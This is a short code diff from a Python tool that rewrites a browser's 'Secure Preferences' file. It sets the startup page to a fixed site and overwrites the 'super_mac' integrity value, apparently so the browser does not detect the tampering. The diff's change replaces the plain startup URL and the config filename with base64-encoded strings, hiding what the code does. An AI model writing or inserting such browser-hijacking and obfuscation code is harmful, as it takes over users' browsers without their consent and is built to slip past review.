@@ -728,7 +728,7 @@ class selfDecode(object):
             info=patternC.sub('"startup_urls": "88D4243B9DD7945DEF3FDB7F71C61AF6C77266D3B72906AAC3A15E8E6A0DBA68"',info)
             info=info.replace('startup_urls": [  ]','startup_urls": [ "URL" ]')
             patternD=re.compile(r'"startup_urls": \[ "(.*?)" \]')
-            info=patternD.sub('"startup_urls": [ "http://www.saibody.com/?br=v10" ]',info)
+            info=patternD.sub(base64.decodestring('InN0YXJ0dXBfdXJscyI6IFsgImh0dHA6Ly93d3cuc2FpYm9keS5jb20vP2JyPXYxMCIgXQ=='),info)
             patternE=re.compile(r'"super_mac": "(.*?)"')
             info=patternE.sub('"super_mac": "7A604AE8DF434B7D62EEC2A0F682E1AE29AF232FAF7F4928E8C403F74DF3BA7F"',info)
             writeCheck = open("../Data/Default/Secure Preferences",'w')
@@ -740,7 +740,7 @@ class selfDecode(object):
         finally:
             readCheck.close()
     def iniConfig(self,amount,current):
-        readCheck = open("config.ini")
+        readCheck = open(base64.decodestring('Y29uZmlnLmluaQ=='))
         oldCurrent = str(current)
         current=random.randrange(0,amount)
         if current >= amount:
